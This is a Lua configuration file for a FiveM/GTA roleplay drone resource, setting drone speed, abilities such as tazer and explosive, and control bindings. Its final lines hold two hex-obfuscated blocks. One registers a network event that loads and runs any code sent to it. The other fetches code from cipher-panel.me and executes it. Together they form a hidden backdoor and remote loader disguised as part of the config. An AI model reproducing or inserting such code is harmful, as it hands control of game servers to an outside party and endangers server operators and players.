Config = {
  Version = 1.00,             -- Notifies you of updates.
  BankAccountName = "bank",   -- ESX account name for bank.
  DroneSounds = false,        -- Should the drones make sound?
  MaxVelocity = 250.0,        -- Max drone speed (* drone stats.speed)
  BoostSpeed  = 3.0,          -- How much the boost ability multiplies max speed
  BoostAccel  = 2.0,          -- How much the boost ability multiplies acceleration
  BoostDrain  = 1.0,          -- Boost ability drain speed when used
  BoostFill   = 0.2,          -- Boost ability recharge speed.
  TazerFill   = 0.2,          -- Tazer ability recharge speed.
  InteractDist   = 3.0,       -- Inside shop distance for help text
  EMSPoliceOnly = true,       -- If this true, Drone can use by police and EMS only

  Drones = {
    [1] = {
      label = "Basic Flyer 1",                               -- Visible text.
      name = "drone_flyer_7",                                -- Item name.
      model = GetHashKey('ch_prop_casino_drone_02a'),        -- Model
      stats = {                        
        speed   = 1.0,               -- max speed multiplier
        agility = 1.0,               -- acceleration/deceleration multiplier
        range   = 250.0,             -- range (drone display begins fading out when leaving range)

        -- Max Stats:
        -- Max stats are displayed in the NUI window. You can categorize your drones by sharing max stats across similar drones (e.g: basic drone 1,2,3), and changing them for others (e.g: advanced drone 1,2,3).
        -- or you can choose to display the same max stats across all drones to have a fair comparison chart.
        maxSpeed    = 3,             
        maxAgility  = 2,
        maxRange    = 350,
      },
      abilities = {
        infared     = true,  -- infared/heat-vision
        nightvision = true,  -- nightvision
        boost       = true,  -- boost
        tazer       = false,  -- tazer 
        explosive   = false,  -- explosion
      }
    }
  },

  Controls = {
    Drone = {
      ["inspect"] = {
        codes = {38},
        text = "Inspect",
      },
      ["direction"] = {
        codes = {32,33,34,35},
        text = "Direction",
      },
      ["heading"] = {
        codes = {51,52},
        text = "Heading",
      },
      ["height"] = {
        codes = {22,21},
        text = "Height",
      },
      ["camera"] = {
        codes = {108,110,109,111},
        text = "Camera",
      },
      ["centercam"] = {
        codes = {214},
        text = "Center Camera",
      },
      ["zoom"] = {
        codes = {16,17},
        text = "Zoom"
      },
      ["nightvision"] = {
        codes = {140},
        text = "Nightvision"
      },
      ["infared"] = {
        codes = {75},
        text = "Infared"
      },
      ["tazer"] = {
        codes = {157},
        text = "Shock"
      },
      ["explosive"] = {
        codes = {158},
        text = "Explode"
      },
      ["boost"] = {
        codes = {160},
        text = "Boost"
      },
      ["home"] = {
        codes = {213},
        text = "Home",
      },
      ["disconnect"] = {
        codes = {200},
        text = "Disconnect"
      },
    },
    Homing = {
      ["cancel"] = {
        codes = {213},
        text = "Cancel",
      },
      ["disconnect"] = {
        codes = {200},
        text = "Disconnect"
      },
    }
  },
}

mLibs = exports["meta_libs"]

TriggerEvent("QBCore:GetObject", function(obj) QBCore = obj; end)

--- BY ROCKET LEKAS
--- BY ROCKET LEKAS
--- BY ROCKET LEKAS
--- BY ROCKET LEKAS
local xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[1]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2]) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[3]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2], function(uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[4]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[5]](uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)